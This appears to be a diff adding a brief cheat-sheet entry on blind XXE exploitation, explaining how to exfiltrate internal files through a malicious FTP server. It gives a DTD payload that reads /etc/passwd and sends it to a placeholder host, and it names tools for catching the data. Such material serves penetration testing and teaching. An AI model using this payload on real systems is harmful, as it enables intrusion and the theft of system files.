@@ -1,0 +1,14 @@
+Exfiltrate internal files using a malicious FTP server
+
+Exploiting a Blind XXE using FTP involves setting up an FTP server and pointing to it inside your malicious dtd file, which will look like this:
+
+            <!ENTITY % file SYSTEM "file:///etc/passwd">
+            <!ENTITY % bar "<!ENTITY &#x25; out SYSTEM ftp://malicious-ftp-server/%file;'>">
+            %bar;
+            %out;
+            
+            
+            
+  Note that the only difference is that you use ftp:// instead of http://
+
+You can easily set up an FTP server using xxeserv. If you don’t have a publicly accessible server, you can use ngrok to expose a local VM to the internet.
